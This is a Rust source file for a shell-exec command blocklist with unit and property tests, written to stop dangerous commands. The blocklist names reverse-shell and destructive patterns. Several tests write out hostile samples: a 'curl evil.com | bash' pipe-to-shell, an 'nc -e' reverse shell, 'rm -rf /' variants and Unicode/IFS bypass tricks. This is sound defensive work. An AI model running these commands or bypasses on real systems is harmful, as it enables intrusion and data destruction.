// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2024-2026 SuperNovae Studio <contact@supernovae.studio>

//! Command blocklist — the safe-by-default security floor for shell exec.
//!
//! Scans the FULL command string (no length cap) after normalizing away the
//! known bypass tricks, then matches ~100 dangerous patterns. Per the spec
//! §3.2 the normalization is layered because each layer closes a real bypass:
//!
//! 1. **NFKC** — fullwidth/confusable Unicode folds to ASCII (`ｒｍ` → `rm`).
//! 2. **Zero-width stripping** — invisible chars NFKC preserves (`r​m` → `rm`).
//! 3. **Whitespace collapse** — runs of whitespace → a single space.
//! 4. **Quote dequoting** — strip `"`/`'`/`\` (`su""do` → `sudo`).
//! 5. **Basename of the first token** — `/usr/bin/sudo rm` → `sudo rm`.
//! 6. **Full-string scan** — an 8000-char pad then `&& rm -rf /` still matches.
//!
//! The match runs against all four projections (lowercased · basename ·
//! dequoted · basename-dequoted) so a pattern hidden behind any one transform
//! is still caught. CRAFT-preserved from the battle-tested brouillon —
//! **do not weaken**: every pattern + layer closes a documented attack.

use nika_kernel::ShellError;

/// Dangerous command patterns (matched case-insensitively after normalization).
const BLOCKLIST: &[&str] = &[
    // Destructive file operations
    "rm -rf /",
    "rm -rf /*",
    "rm -rf ~",
    "rm --recursive",
    "rm --force",
    // Remote code execution (piping downloads to a shell)
    "| bash",
    "|bash",
    "| sh",
    "|sh",
    // Shell injection via dynamic execution
    "eval ",
    // Named pipes (reverse shells)
    "mkfifo",
    // Netcat reverse shells
    "nc -e",
    "nc -c",
    "ncat -e",
    "ncat -c",
    // Chained destructive commands
    "; rm ",
    "&& rm ",
    "| rm ",
    // Fork bombs
    ":(){ :|:& };:",
    // Unix shell -c (arbitrary command execution)
    "bash -c",
    "sh -c",
    "zsh -c",
    "dash -c",
    "ksh -c",
    "csh -c",
    "tcsh -c",
    // Interpreter -c (arbitrary code execution)
    "python -c",
    "python2 -c",
    "python3 -c",
    // Indirect command execution via find/xargs
    " -exec ",
    " -execdir ",
    " -delete",
    "xargs ",
    // Privilege escalation
    "sudo ",
    "doas ",
    "pkexec ",
    "su ",
    // Dangerous permission changes
    "chmod 777",
    "chmod -r 777",
    "chmod a+rwx",
    // Base64-encoded payload execution
    "base64 -d |",
    "base64 --decode |",
    "| base64 -d",
    "| base64 --decode",
    // Disk destruction
    "dd if=",
    // Interpreter bypass (scripting runtimes)
    "perl -e",
    "ruby -e",
    "node -e",
    // Piping to interpreter stdin
    "| python",
    "|python",
    "| python3",
    "|python3",
    "| ruby",
    "|ruby",
    "| node",
    "|node",
    "| perl",
    "|perl",
    "| php",
    "|php",
    // Command-wrapper bypass
    "env ",
    "command ",
    "builtin ",
    "nohup ",
    "nice ",
    "timeout ",
    "strace ",
    // Shell builtins for script/coprocess execution
    "source ",
    "coproc ",
    // Bash virtual files for reverse shells
    "/dev/tcp/",
    "/dev/udp/",
    // Windows-specific dangerous patterns
    "del /f",
    "del /s",
    "rd /s /q",
    "rmdir /s /q",
    "format c:",
    "format d:",
    "shutdown /s",
    "shutdown /r",
    "cmd /c",
    "cmd.exe /c",
    "powershell -c",
    "powershell.exe -c",
    "powershell -enc",
    "powershell -encodedcommand",
    "reg delete",
    "sc delete",
    "runas ",
    // System control (Unix)
    "shutdown",
    "reboot",
    "halt",
    "poweroff",
    "init 0",
    "init 6",
];

/// Shell-mode patterns ALWAYS blocked (structural commands · `shell: true`).
const SHELL_MODE_BLOCKLIST: &[&str] = &["alias ", "function ", "declare -f"];

/// Programs blocked at the ARGV floor by their BASENAME alone — their mere
/// invocation is dangerous regardless of arguments. `command[0]` can be an
/// interpolated, attacker-influenced value, so [`check_program`] NFKC-
/// normalizes confusables (fullwidth `ｓｕｄｏ` → `sudo`) before the EXACT
/// basename match (no substring false-positives · `issue` ≠ `su`). The argv
/// re-exec class (interpreter `-c`/`-e`, `nc -e`, `dd if=`) is handled
/// structurally by [`check_argv`] — symmetric with shell mode.
const DANGEROUS_PROGRAMS: &[&str] = &[
    // Privilege escalation
    "sudo", "doas", "pkexec", "su", "runas",
    // System control (halts / reboots / powers off the host)
    "shutdown", "reboot", "halt", "poweroff",
    // Re-exec / env re-injection (review P0): `env VAR=x cmd` re-adds a
    // stripped var into the child (defeats the env scrub); `xargs` runs a
    // command built from its input. Workflows use the `env:` field, not `env`.
    "env", "xargs",
];

/// One interpreter family's inline-eval signature (P0-13 · audit UX
/// 2026-07-30). The flag that re-parses an argument AS code is a property of
/// the INTERPRETER (and its subcommand), not a global set — `python -c` and
/// `node -p` eval, but `node -c` is a syntax check, `php -r` evals, and
/// `unittest -p <pattern>` is the module's own flag, not a print-eval. A
/// global set both over-blocked (the `python3 -m unittest … -p` false
/// positive) and under-blocked (`deno eval <code>` — a SUBCOMMAND the flag
/// scan never saw).
#[derive(Clone, Copy)]
struct EvalSpec {
    /// Short-option LETTERS: any single-dash bundle containing one re-parses
    /// code (`perl -pe` · `node -pe` · `sh -ce`).
    short_letters: &'static [char],
    /// Long eval flags, EXACT — only where the interpreter really has them.
    long_flags: &'static [&'static str],
    /// Eval SUBCOMMANDS (`deno eval <code>`) — code execution with no flag.
    eval_subcommands: &'static [&'static str],
    /// Flags that CONSUME the next argv element as their operand — skipped,
    /// so the scan resumes after them (`python3 -X faulthandler -c …`).
    value_flags: &'static [&'static str],
    /// The module handoff (python `-m`): everything after `-m <module>` is
    /// the MODULE's argv — the interpreter's scan stops there.
    module_flag: Option<&'static str>,
}

/// The per-interpreter eval table — `None` for a program with no inline-eval
/// form. Running any of these on a SCRIPT FILE (`["python","app.py"]`) stays
/// allowed; only an eval flag/subcommand in the INTERPRETER's own argv
/// (before the script positional, `--`, or `-m <module>`) is refused at the
/// floor (route a genuine need via `pre_validated`).
fn eval_spec(base: &str) -> Option<EvalSpec> {
    const SHELLS: EvalSpec = EvalSpec {
        short_letters: &['c'],
        long_flags: &[],
        eval_subcommands: &[],
        value_flags: &[],
        module_flag: None,
    };
    const PYTHON: EvalSpec = EvalSpec {
        short_letters: &['c'],
        long_flags: &[],
        eval_subcommands: &[],
        value_flags: &["-W", "-X"],
        module_flag: Some("-m"),
    };
    const PERL_RUBY: EvalSpec = EvalSpec {
        short_letters: &['e', 'E'],
        long_flags: &[],
        eval_subcommands: &[],
        value_flags: &["-I", "-M", "-m", "-r"],
        module_flag: None,
    };
    const NODE: EvalSpec = EvalSpec {
        short_letters: &['e', 'p'],
        long_flags: &["--eval", "--print"],
        eval_subcommands: &[],
        value_flags: &["-r", "--require", "--import", "--loader"],
        module_flag: None,
    };
    const DENO_BUN: EvalSpec = EvalSpec {
        short_letters: &['e', 'p'],
        long_flags: &["--eval", "--print"],
        eval_subcommands: &["eval"],
        value_flags: &["-r", "--require", "--import", "--loader"],
        module_flag: None,
    };
    const PHP: EvalSpec = EvalSpec {
        short_letters: &['r'],
        long_flags: &[],
        eval_subcommands: &[],
        value_flags: &["-d", "-c"],
        module_flag: None,
    };
    match base {
        "sh" | "bash" | "zsh" | "dash" | "ksh" | "csh" | "tcsh" => Some(SHELLS),
        "python" | "python2" | "python3" => Some(PYTHON),
        "perl" | "ruby" => Some(PERL_RUBY),
        "node" => Some(NODE),
        "deno" | "bun" => Some(DENO_BUN),
        "php" => Some(PHP),
        _ => None,
    }
}

/// Zero-width / invisible characters stripped before the blocklist check
/// (NFKC preserves these — they are a confusable-bypass vector on their own).
const ZERO_WIDTH_CHARS: &[char] = &[
    '\u{200B}', // Zero Width Space
    '\u{200C}', // Zero Width Non-Joiner
    '\u{200D}', // Zero Width Joiner
    '\u{FEFF}', // Zero Width No-Break Space (BOM)
    '\u{00AD}', // Soft Hyphen
    '\u{2060}', // Word Joiner
    '\u{180E}', // Mongolian Vowel Separator
];

/// NFKC-normalize + strip zero-width + collapse whitespace.
fn normalize_for_blocklist(s: &str) -> String {
    use unicode_normalization::UnicodeNormalization;
    s.nfkc()
        .filter(|c| !ZERO_WIDTH_CHARS.contains(c))
        .collect::<String>()
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
}

/// Replace the first token with its basename (`/usr/bin/sudo rm` → `sudo rm`),
/// so an absolute-path prefix cannot hide a blocklisted program.
fn normalize_first_token_basename(cmd: &str) -> String {
    let mut parts = cmd.splitn(2, ' ');
    let first = parts.next().unwrap_or("");
    let rest = parts.next().unwrap_or("");
    let basename = first.rsplit('/').next().unwrap_or(first);
    if rest.is_empty() {
        basename.to_string()
    } else {
        format!("{basename} {rest}")
    }
}

/// Check a command against the blocklist.
///
/// # Errors
///
/// [`ShellError::Blocked`] when the command (under any normalization
/// projection) contains a blocklisted pattern.
pub(crate) fn check_command(command: &str) -> Result<(), ShellError> {
    let normalized = normalize_for_blocklist(command);
    let lower = normalized.to_lowercase();

    // Strip shell quoting: `su""do` → `sudo`, `s'u'd'o'` → `sudo`.
    let dequoted: String = lower
        .chars()
        .filter(|c| !matches!(c, '"' | '\'' | '\\'))
        .collect();

    // Basename-resolve the first token under both projections (from the
    // UN-padded strings — a leading space would empty the first token).
    let basename_normalized = normalize_first_token_basename(&lower);
    let basename_dequoted = normalize_first_token_basename(&dequoted);

    // Wrap every haystack in sentinel spaces before matching.
    // `normalize_for_blocklist`'s `split_whitespace().join(" ")` TRIMS both
    // leading and trailing whitespace, so a pattern with a boundary space
    // ("sudo ", "; rm ", " -exec ", "env ") would miss when the command
    // BEGINS or ENDS at the pattern (`foo; rm`, `find -exec`). The sentinels
    // restore those boundaries. Adding spaces can only ADD matches (strictly
    // safe-side · over-blocks at most a harmless operand-less fragment).
    // Guarded by the Gate-6 property test.
    let lower = format!(" {lower} ");
    let basename_normalized = format!(" {basename_normalized} ");
    let dequoted = format!(" {dequoted} ");
    let basename_dequoted = format!(" {basename_dequoted} ");

    for pattern in BLOCKLIST {
        let p = pattern.to_lowercase();
        if lower.contains(&p)
            || basename_normalized.contains(&p)
            || dequoted.contains(&p)
            || basename_dequoted.contains(&p)
        {
            return Err(ShellError::Blocked {
                reason: "command matches security blocklist".to_string(),
            });
        }
    }

    Ok(())
}

/// Check shell-mode-specific patterns (`alias`/`function`/`declare -f`).
///
/// # Errors
///
/// [`ShellError::Blocked`] on a shell-mode blocklisted pattern.
pub(crate) fn check_shell_mode(command: &str) -> Result<(), ShellError> {
    let normalized = normalize_for_blocklist(command);
    let lower = normalized.to_lowercase();
    for pattern in SHELL_MODE_BLOCKLIST {
        if lower.contains(pattern) {
            return Err(ShellError::Blocked {
                reason: format!("shell-mode blocklisted pattern: {pattern}"),
            });
        }
    }
    // SECURITY (Gate-11 swarm + review P1): `sh -c` performs EXPANSION after
    // this static check — the structural TOCTOU class. `$VAR`/`${IFS}`/`$(…)`/
    // backticks render `rm${IFS}-rf${IFS}/` → `rm -rf /`; pathname globbing
    // (`* ? [`), brace `{…}`, and tilde `~` render `/usr/bin/sud*` → `sudo`;
    // a `(…)` sub-shell / process-substitution runs a nested program. A
    // baseline mechanism cannot predict any of these, so it REFUSES the
    // expansion / substitution / grouping chars outright. Pipes `|` and
    // redirects `<`/`>` are NOT expansion — they stay allowed. (NFKC has
    // folded the fullwidth `＄` U+FF04 → `$`.) A genuine need goes through
    // nika-policy, which sets `pre_validated` — this check is then skipped.
    if let Some(c) = normalized
        .chars()
        .find(|&c| matches!(c, '$' | '`' | '*' | '?' | '[' | '{' | '~' | '('))
    {
        return Err(ShellError::Blocked {
            reason: format!(
                "shell-mode expansion/substitution char refused: {c:?} (route via pre_validated)"
            ),
        });
    }
    Ok(())
}

/// The normalized lowercase BASENAME of an argv program — NFKC + zero-width
/// folding (because `command[0]` may be an interpolated, attacker-influenced
/// value), then the path tail. Quoting is NOT stripped — `execve` takes the
/// program literally, so `su""do` is a (non-existent) filename, not `sudo`.
fn program_basename(program: &str) -> String {
    let normalized = normalize_for_blocklist(program);
    normalized
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(normalized.as_str())
        .to_lowercase()
}

/// Check an argv-form PROGRAM's IDENTITY against [`DANGEROUS_PROGRAMS`] (an
/// exact basename match · no substring false-positives).
///
/// # Errors
///
/// [`ShellError::Blocked`] when the program basename is a dangerous program.
pub(crate) fn check_program(program: &str) -> Result<(), ShellError> {
    let base = program_basename(program);
    if DANGEROUS_PROGRAMS.contains(&base.as_str()) {
        return Err(ShellError::Blocked {
            reason: format!(
                "program {base:?} is blocked at the exec floor \
                 (privilege escalation / system control / re-exec)"
            ),
        });
    }
    Ok(())
}

/// Check a full argv-form command at the floor: the program IDENTITY
/// ([`check_program`]) PLUS the structural re-exec class that shell mode
/// blocks but a name-only check misses — an interpreter invoked with an
/// inline-eval flag or subcommand (`["sh","-c",…]` · `["python","-c",…]` ·
/// `["perl","-e",…]` · `["deno","eval",…]`, per the interpreter's own
/// [`eval_spec`] · P0-13), `nc -e`/`-c` (reverse shell), `dd if=`/`of=`
/// (raw disk). Checked STRUCTURALLY (positionally, per discrete argv
/// element), so a LITERAL argument that merely CONTAINS such text is NOT a
/// false positive — the difference from a joined-string scan. Without this
/// the argv form re-introduces every interpreter / `env` danger shell mode
/// forbids (review P0).
///
/// # Errors
///
/// [`ShellError::Blocked`] on a dangerous program or a re-exec form.
pub(crate) fn check_argv(program: &str, args: &[String]) -> Result<(), ShellError> {
    check_program(program)?;
    let base = program_basename(program);

    if interpreter_eval_requested(&base, args) {
        return Err(ShellError::Blocked {
            reason: format!(
                "argv interpreter inline-eval refused: {base:?} with an eval flag \
                 or subcommand runs attacker-influenceable code — run a script \
                 file or route via pre_validated"
            ),
        });
    }
    if matches!(base.as_str(), "nc" | "ncat")
        && args
            .iter()
            .any(|a| a.starts_with("-e") || a.starts_with("-c"))
    {
        return Err(ShellError::Blocked {
            reason: "argv `nc -e/-c` (reverse shell) refused at the exec floor".to_string(),
        });
    }
    if base == "dd"
        && args
            .iter()
            .any(|a| a.starts_with("if=") || a.starts_with("of="))
    {
        return Err(ShellError::Blocked {
            reason: "argv `dd if=/of=` (raw disk read/write) refused at the exec floor".to_string(),
        });
    }
    Ok(())
}

/// Whether an interpreter's argv requests INLINE code evaluation (vs running
/// a script file) — POSITIONAL over the discrete argv elements, per the
/// interpreter's [`EvalSpec`] (P0-13): an eval flag (`python -c` · `node -p`
/// · `perl -pe` · `php -r`) or an eval SUBCOMMAND (`deno eval`) before the
/// handoff point refuses; the scan stops at the first positional (the script
/// file — the flags after it are the SCRIPT's argv), at `--`, and at the
/// module handoff (`python -m <module>` — the flags after it are the
/// MODULE's, so `python3 -m unittest discover -p test_*.py` stays allowed).
fn interpreter_eval_requested(base: &str, args: &[String]) -> bool {
    let Some(spec) = eval_spec(base) else {
        return false;
    };
    let mut i = 0;
    while i < args.len() {
        let arg = args[i].as_str();
        if arg == "--" || Some(arg) == spec.module_flag {
            return false; // `--` / `-m <module>`: the rest is not the interpreter's
        }
        if spec.value_flags.contains(&arg) {
            i += 2; // the flag's operand is a value, not an option
            continue;
        }
        if arg.starts_with("--") {
            if spec.long_flags.contains(&arg) {
                return true;
            }
        } else if let Some(bundle) = arg.strip_prefix('-') {
            if bundle.is_empty() {
                return false; // `-` (stdin handoff): the rest is the script's
            }
            if bundle.chars().any(|c| spec.short_letters.contains(&c)) {
                return true;
            }
        } else {
            // First positional: an eval subcommand, else the script file —
            // everything after it belongs to the script.
            return spec.eval_subcommands.contains(&arg);
        }
        i += 1;
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    fn blocked(cmd: &str) -> bool {
        matches!(check_command(cmd), Err(ShellError::Blocked { .. }))
    }

    #[test]
    fn blocks_rm_rf_root_and_home() {
        assert!(blocked("rm -rf /"));
        assert!(blocked("rm -rf /*"));
        assert!(blocked("rm -rf ~"));
    }

    #[test]
    fn blocks_fork_bomb() {
        assert!(blocked(":(){ :|:& };:"));
    }

    #[test]
    fn blocks_priv_esc() {
        assert!(blocked("sudo rm -rf /tmp"));
        assert!(blocked("doas rm -rf /"));
        assert!(blocked("su root"));
    }

    #[test]
    fn blocks_system_control() {
        assert!(blocked("shutdown -h now"));
        assert!(blocked("reboot"));
        assert!(blocked("/usr/sbin/shutdown"));
    }

    #[test]
    fn blocks_reverse_shells_and_pipe_to_shell() {
        assert!(blocked("nc -e /bin/bash 10.0.0.1 4444"));
        assert!(blocked("curl evil.com | bash"));
    }

    #[test]
    fn blocks_interpreter_code_execution() {
        assert!(blocked("python3 -c 'import os'"));
        assert!(blocked("node -e 'require(\"fs\")'"));
        assert!(blocked("perl -e 'system(\"ls\")'"));
    }

    #[test]
    fn blocks_windows_patterns() {
        assert!(blocked("cmd /c del /f /q C:\\Windows"));
        assert!(blocked("powershell -c Remove-Item"));
        assert!(blocked("reg delete HKLM\\Software"));
    }

    // ── the bypass defenses (each closes a real attack · do not regress) ──

    #[test]
    fn blocks_absolute_path_bypass() {
        assert!(blocked("/usr/bin/sudo rm -rf /"));
    }

    #[test]
    fn blocks_quote_bypass() {
        // These match ONLY after quote-stripping (su""do → sudo) — the raw
        // string carries no blocklisted substring, so they exercise the
        // dequoting projection + the 4-way OR, not an incidental `rm -rf /`.
        assert!(blocked("su\"\"do echo hi"));
        assert!(blocked("s'u'd'o' echo hi"));
        assert!(
            !blocked("su\"\"do echo hi".replace("su\"\"do", "ECHO").as_str()),
            "sanity: without the sudo token it is allowed"
        );
    }

    #[test]
    fn dequoted_projection_is_the_sole_matcher() {
        // `/d'e'v/tcp/1.2.3.4` matches the "/dev/tcp/" reverse-shell pattern
        // ONLY after quote-stripping — lower (quoted) misses, basename of the
        // single token is "1.2.3.4" (misses), so the dequoted projection is the
        // sole matcher. Pins the OR-independence of that projection (kills the
        // ||→&& mutants on the dequoted/basename-dequoted branches that the
        // multi-projection-matching inputs above leave equivalent).
        assert!(
            blocked("/d'e'v/tcp/1.2.3.4"),
            "dequoted projection must catch it alone"
        );
    }

    #[test]
    fn basename_helper_strips_first_token_path() {
        assert_eq!(
            normalize_first_token_basename("/usr/bin/sudo rm"),
            "sudo rm"
        );
        assert_eq!(normalize_first_token_basename("/a/b/c/tool"), "tool");
        assert_eq!(
            normalize_first_token_basename("plain arg1 arg2"),
            "plain arg1 arg2"
        );
        assert_eq!(normalize_first_token_basename(""), "");
    }

    #[test]
    fn blocks_full_string_scan_no_length_cap() {
        let evil = format!("{} && rm -rf /", "a".repeat(8000));
        assert!(blocked(&evil));
    }

    #[test]
    fn blocks_nfkc_fullwidth_bypass() {
        // U+FF52 U+FF4D = fullwidth "rm" → NFKC → "rm"
        assert!(blocked("\u{FF52}\u{FF4D} -rf /"));
    }

    #[test]
    fn blocks_zero_width_bypass() {
        // Zero-width space inside "rm" is stripped → "rm -rf /"
        assert!(blocked("r\u{200B}m -rf /"));
    }

    // ── P1 (Gate-11 swarm): shell-expansion TOCTOU bypasses are refused ──

    fn shell_blocked(cmd: &str) -> bool {
        matches!(check_shell_mode(cmd), Err(ShellError::Blocked { .. }))
    }

    #[test]
    fn shell_mode_refuses_ifs_expansion_bypass() {
        // `rm${IFS}-rf${IFS}/` passes check_command (no literal "rm -rf /")
        // but sh -c would expand $IFS to spaces → `rm -rf /`. check_shell_mode
        // must refuse it. (The crucial regression guard for the P1.)
        assert!(
            !blocked("rm${IFS}-rf${IFS}/"),
            "premise: template scan misses it"
        );
        assert!(
            shell_blocked("rm${IFS}-rf${IFS}/"),
            "shell mode must refuse the $ expansion"
        );
    }

    #[test]
    fn shell_mode_refuses_var_indirection_and_subst_and_backtick() {
        assert!(shell_blocked("rm $NIKA_ARGS")); // env-var indirection
        assert!(shell_blocked("echo $(rm -rf /)")); // command substitution
        assert!(shell_blocked("echo `whoami`")); // backtick substitution
        assert!(shell_blocked("rm $'\t'-rf /")); // ANSI-C quoting expansion
    }

    #[test]
    fn shell_mode_refuses_fullwidth_dollar() {
        // NFKC folds fullwidth ＄ (U+FF04) → $, so the confusable is caught too.
        assert!(shell_blocked("rm \u{FF04}{IFS}-rf /"));
    }

    #[test]
    fn shell_mode_allows_plain_pipes_and_redirects() {
        // Legit shell features with NO expansion vector still pass — the
        // pipe/redirect use case (e.g. `yes | head`, `echo x 1>&2`) is intact.
        assert!(check_shell_mode("yes hello | head -c 100").is_ok());
        assert!(check_shell_mode("echo out 1>&2").is_ok());
        assert!(check_shell_mode("ls -la | wc -l").is_ok());
    }

    #[test]
    fn shell_mode_blocks_alias_and_function() {
        assert!(matches!(
            check_shell_mode("alias rm='echo safe'"),
            Err(ShellError::Blocked { .. })
        ));
        assert!(matches!(
            check_shell_mode("function rm() { true; }"),
            Err(ShellError::Blocked { .. })
        ));
    }

    // ── safe commands must pass (no false positives) ──

    #[test]
    fn allows_safe_commands() {
        for ok in [
            "echo hello",
            "ls -la",
            "cat file.txt",
            "python3 script.py",
            "npm run build",
            "cargo test",
            "ffmpeg -i input.mp4 output.mp3",
            "git status",
        ] {
            assert!(check_command(ok).is_ok(), "should allow: {ok}");
        }
    }

    #[test]
    fn allows_rm_with_specific_paths() {
        assert!(check_command("rm /tmp/test.txt").is_ok());
        assert!(check_command("rm -f output.log").is_ok());
    }

    // ── Gate 6 PROPERTY (security): the full-string-scan invariant ──
    //
    // EVERY blocklist pattern, wrapped in arbitrary alphanumeric padding,
    // is always blocked. This proves the scan holds for ALL ~100 patterns
    // (not just the hand-picked cases above) — a future pattern that somehow
    // failed to match would be caught here. Alphanumeric padding can't be
    // touched by NFKC / zero-width / dequoting / whitespace-collapse, and
    // substring `contains` is never broken by a prefix, so the pattern's
    // own bytes survive intact.
    proptest::proptest! {
        #![proptest_config(proptest::prelude::ProptestConfig::with_cases(256))]

        #[test]
        fn every_blocklist_pattern_blocks_under_padding(
            idx in 0usize..BLOCKLIST.len(),
            pre in "[a-z0-9]{0,8}",
            suf in "[a-z0-9]{0,8}",
        ) {
            let cmd = format!("{pre}{}{suf}", BLOCKLIST[idx]);
            proptest::prop_assert!(
                blocked(&cmd),
                "pattern {:?} must stay blocked padded as {:?}",
                BLOCKLIST[idx], cmd
            );
        }
    }

    /// Documented over-block: substring matching means the `env ` wrapper
    /// pattern also catches `printenv ` (and `su ` catches `issue `, etc.).
    /// This is the deliberate safe-by-default cost of a simple blocklist —
    /// over-blocking a rare-but-safe command beats under-blocking an attack.
    /// Callers with intent-aware validation set `pre_validated`. A word-
    /// boundary refinement is a Round-2 candidate (swarm to opine).
    #[test]
    fn printenv_is_over_blocked() {
        assert!(blocked("printenv PATH"), "env-wrapper substring over-block");
    }

    // ── argv-mode program floor (check_program · exact basename) ──
    //
    // The shell-line scanner above is the SHELL-mode tripwire. Argv mode has
    // no shell, so it checks only the program's IDENTITY — which removes the
    // shell-line false-positives (printenv / timeout / env / nice) AND the
    // value false-positives (a `;` inside an argument is a literal char).

    fn prog_blocked(program: &str) -> bool {
        matches!(check_program(program), Err(ShellError::Blocked { .. }))
    }

    #[test]
    fn argv_floor_blocks_priv_esc_and_system_control() {
        for p in [
            "sudo",
            "/usr/bin/sudo",
            "doas",
            "pkexec",
            "su",
            "runas",
            "shutdown",
            "/sbin/reboot",
            "halt",
            "poweroff",
        ] {
            assert!(prog_blocked(p), "argv floor must block: {p}");
        }
    }

    #[test]
    fn argv_floor_is_exact_basename_not_substring() {
        // `su` is blocked, but programs that merely CONTAIN it are not —
        // exact basename match kills the substring false-positives.
        assert!(prog_blocked("su"));
        for ok in ["issue", "sudoku", "subl", "lsusb"] {
            assert!(check_program(ok).is_ok(), "must allow: {ok}");
        }
    }

    #[test]
    fn argv_floor_allows_normal_programs_and_shell_wrappers() {
        // The wrappers the SHELL-line scanner over-blocks (timeout / env /
        // nice) and ordinary tools pass the argv floor — checked by identity,
        // not by a fake-shell scan of their arguments.
        for ok in [
            "echo", "cargo", "git", "npm", "ffmpeg", "timeout", "nice", "rm", "printenv",
        ] {
            assert!(check_program(ok).is_ok(), "argv floor must allow: {ok}");
        }
    }

    #[test]
    fn argv_floor_normalizes_confusable_program() {
        // An interpolated `command[0]` of fullwidth `ｓｕｄｏ` folds to `sudo`.
        assert!(prog_blocked("\u{FF53}\u{FF55}\u{FF44}\u{FF4F}"));
    }

    #[test]
    fn argv_floor_does_not_dequote_the_program() {
        // execve takes the program literally; `su""do` is a filename that is
        // NOT `sudo` (no shell to strip the quotes), so the floor allows it
        // (it would simply fail to spawn as NotFound).
        assert!(check_program("su\"\"do").is_ok());
    }

    // ── argv re-exec class (check_argv · review P0) ──────────────────

    fn argv_blocked(program: &str, args: &[&str]) -> bool {
        let owned: Vec<String> = args.iter().map(|s| (*s).to_string()).collect();
        matches!(check_argv(program, &owned), Err(ShellError::Blocked { .. }))
    }

    fn argv_ok(program: &str, args: &[&str]) -> bool {
        let owned: Vec<String> = args.iter().map(|s| (*s).to_string()).collect();
        check_argv(program, &owned).is_ok()
    }

    #[test]
    fn argv_floor_blocks_interpreter_inline_code() {
        // The re-exec class shell mode forbids must NOT be reachable via argv.
        assert!(argv_blocked("sh", &["-c", "rm -rf /"]));
        assert!(argv_blocked("bash", &["-c", "evil"]));
        assert!(argv_blocked("/usr/bin/python3", &["-c", "import os"]));
        assert!(argv_blocked("perl", &["-e", "system('id')"]));
        assert!(argv_blocked("node", &["-e", "process.exit()"]));
        assert!(argv_blocked("ruby", &["-e", "x"]));
        assert!(argv_blocked("node", &["--eval", "x"])); // long form
        assert!(argv_blocked("python", &["-c"])); // the eval flag is the signal
    }

    #[test]
    fn argv_floor_allows_interpreters_on_script_files() {
        // The legit case — an interpreter on a SCRIPT FILE (no eval flag).
        assert!(argv_ok("python3", &["app.py", "--port", "8080"]));
        assert!(argv_ok("node", &["server.js"]));
        assert!(argv_ok("bash", &["deploy.sh", "prod"]));
        assert!(argv_ok("ruby", &["rake", "test"]));
        assert!(argv_ok("python", &["-m", "pytest"])); // -m is module, not eval
    }

    // ── P0-13 (audit UX 2026-07-30): eval flags are PER-INTERPRETER ──
    //
    // The old global flag set (`-c`/`-e`/`-E`/`-r`/`-p` for every
    // interpreter) both over-blocked (`unittest -p <pattern>` · `node -c`
    // syntax check) and under-blocked (`deno eval <code>` — a subcommand,
    // not a flag). The table is per interpreter + positional over argv.

    #[test]
    fn argv_floor_python_m_makes_later_flags_the_modules() {
        // THE false positive of the finding (fixture
        // journey-python-unittest-pattern): after `-m <module>` the rest of
        // argv is the MODULE's — `unittest -p <pattern>` is a pattern flag,
        // not a print-eval.
        assert!(argv_ok(
            "python3",
            &["-m", "unittest", "discover", "tests", "-p", "test_*.py"]
        ));
        assert!(argv_ok("python3", &["-m", "pip", "--version"]));
        // …but python's OWN eval flag still refuses, wherever it sits.
        assert!(argv_blocked("python3", &["-c", "import os"]));
        assert!(argv_blocked("python", &["-v", "-c", "x"]));
    }

    #[test]
    fn argv_floor_node_p_and_print_block_but_c_is_a_syntax_check() {
        // node's eval-print flags refuse; `-c`/`--check` is a SYNTAX CHECK
        // (no code runs) — the global table mis-mapped `-c` onto node.
        assert!(argv_blocked("node", &["-p", "1+1"]));
        assert!(argv_blocked("node", &["--print", "1+1"]));
        assert!(argv_blocked("node", &["-e", "x"]));
        assert!(argv_blocked("node", &["--eval", "x"]));
        assert!(argv_blocked("node", &["-pe", "x"])); // bundled eval-print
        assert!(argv_ok("node", &["-c", "server.js"]));
        assert!(argv_ok("node", &["--check", "server.js"]));
    }

    #[test]
    fn argv_floor_deno_bun_eval_subcommand_blocks() {
        // The reverse false-negative of the finding: `deno eval <code>`
        // re-parses an argument AS code via a SUBCOMMAND the global-flag
        // scan never looked at.
        assert!(argv_blocked("deno", &["eval", "Deno.exit(1)"]));
        assert!(argv_blocked("bun", &["eval", "process.exit(1)"]));
        // …while other subcommands and the node-style flags stay per family.
        assert!(argv_ok("deno", &["run", "server.ts"]));
        assert!(argv_blocked("bun", &["-e", "x"]));
    }

    #[test]
    fn argv_floor_php_perl_ruby_keep_their_own_eval_flags() {
        assert!(argv_blocked("php", &["-r", "system('id');"]));
        assert!(argv_blocked("perl", &["-e", "x"]));
        assert!(argv_blocked("perl", &["-pe", "s/a/b/"])); // bundled eval
        assert!(argv_blocked("ruby", &["-e", "x"]));
        assert!(argv_blocked("ruby", &["-E", "x"]));
        // No cross-family bleed: `-c` is not eval for php/perl/ruby (ruby's
        // `-c` is a syntax check, php's `-l` a lint).
        assert!(argv_ok("ruby", &["-c", "app.rb"]));
        assert!(argv_ok("php", &["-l", "index.php"]));
    }

    #[test]
    fn argv_floor_eval_flags_stop_at_the_script_positional() {
        // Positional argv parsing: the flags AFTER the script file belong to
        // the SCRIPT (they land in its argv), not to the interpreter.
        assert!(argv_ok("python3", &["app.py", "-p", "8080"]));
        assert!(argv_ok("node", &["server.js", "-p", "8080"]));
        // Value-taking interpreter flags consume their operand — scanning
        // resumes after them, so the eval flag is still caught.
        assert!(argv_blocked("python3", &["-X", "faulthandler", "-c", "x"]));
        assert!(argv_blocked("node", &["--require", "ts-node", "-e", "x"]));
    }

    #[test]
    fn argv_floor_blocks_env_reinjection_and_reverse_shells() {
        // `env` re-adds a stripped var into the child → defeats the env scrub.
        assert!(argv_blocked(
            "env",
            &["LD_PRELOAD=/tmp/x.so", "cat", "/secret"]
        ));
        assert!(argv_blocked("/usr/bin/env", &["sh", "-c", "evil"]));
        assert!(argv_blocked("xargs", &["rm"]));
        assert!(argv_blocked("nc", &["-e", "/bin/sh", "10.0.0.1", "4444"]));
        assert!(argv_blocked("ncat", &["-c", "sh"]));
        assert!(argv_blocked("dd", &["if=/dev/sda", "of=/dev/null"]));
    }

    #[test]
    fn argv_floor_allows_ordinary_argv_with_metachar_args() {
        // The Step-2 property holds: a LITERAL arg carrying shell metacharacters
        // (or interpreter-flag TEXT) is NOT a false positive — no shell, and
        // check_argv is structural (per element).
        assert!(argv_ok("echo", &["a; b | c"]));
        assert!(argv_ok("printf", &["%s", "; rm -rf /"]));
        assert!(argv_ok("echo", &["run python -c please"])); // literal text
